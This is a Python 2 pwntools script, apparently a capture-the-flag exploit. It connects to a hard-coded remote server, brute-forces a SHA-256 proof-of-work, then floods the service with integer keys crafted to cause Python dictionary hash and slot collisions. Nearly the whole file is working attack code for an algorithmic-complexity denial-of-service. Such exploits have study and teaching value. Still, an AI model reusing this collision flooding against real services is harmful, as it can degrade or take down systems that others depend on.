#!/usr/bin/env python
from pwn import *
import os
import time
import random
import hashlib


import time

def integer_hash_collisions(max=1000):

    print 'Hash collision attack:'

    d = {}
    for x in xrange(max):
        i = x*(2**64 - 1) + 1 
        #print 'adding %i with hash %i' % (i, hash(i))
        d[i] = 1
    print 'generated dict with %i items' % len(d)
    return d

def integer_slot_collisions(max=1000):

    # print 'Slot collision attack:'

    # Fill the dict slots starting at (hash) position 1
    d = {1:1}
    i = 1
    perturb = i
    # print 'seeding the dict:'
    for x in xrange(max):
        # i = ((i << 2) + i + perturb + 1) & 0xffffffffffffffff
        i = ((i << 2) + i + perturb + 1) & 0x3fffffff

        #print 'adding %i with hash %i' % (i, hash(i))
        d[i] = 1
        perturb >>= 5

    # Add new keys
    # print 'generating slot collisions:'
    # cause a hash collision on the first try to enter the
    # prepared slot collision path
    # i = 1*(2**64 - 1) + 1
    i = 1*(2**30 - 1) + 1

    for x in xrange(max):
        #print 'adding %i with hash %i' % (i, hash(i))
        d[i] = 1
    print 'generated dict with %i items' % len(d)
    return d



def sha256(content):
    Hash = hashlib.sha256()
    Hash.update(content)
    return Hash.digest()


r = remote("140.112.31.97" , 10159)
print "1. " , str(r.recv())
challenge = str(r.recv())
print "2. " , challenge
challenge = challenge[-8:-2]
print "3. challenge = " , challenge 

while True:
    x = str(random.randint(0,2**29)).encode("hex")
    # print x
    x2 = x.decode("hex")
    
    x_hash = sha256(x2).encode("hex")
    # print "x_hash = ",x_hash[-6:]

    if x_hash[-6:] == challenge:
        print "x = " , x
        print "x2 = " , x2
        print "x_hash = " , x_hash
        r.sendline(x)
        break

print '4. ',str(r.recv())

# input n
n = 20000
d = integer_slot_collisions(n)
print(len(d))

# send dict size
r.sendline('50000')
# print str(r.recv())
# print str(r.recv())
print("5. send n .")



start = time.time()


for key in d.keys():
    r.sendline(str(key))
    print "send : " , str(key)
print "6. finish send dict."

for i in range(50000-len(d)):
    r.sendline('0')
    print i
print '7. finish send data.'

print str(r.recv())
print str(r.recv())
print str(r.recv())

print 'end.'


# print "d.keys = ",d.keys()
key_list = d.keys()
for i in range(50000-len(d)):
    key_list.append(0)
print "key_list_length = " , len(key_list)
print "key_list = ",key_list
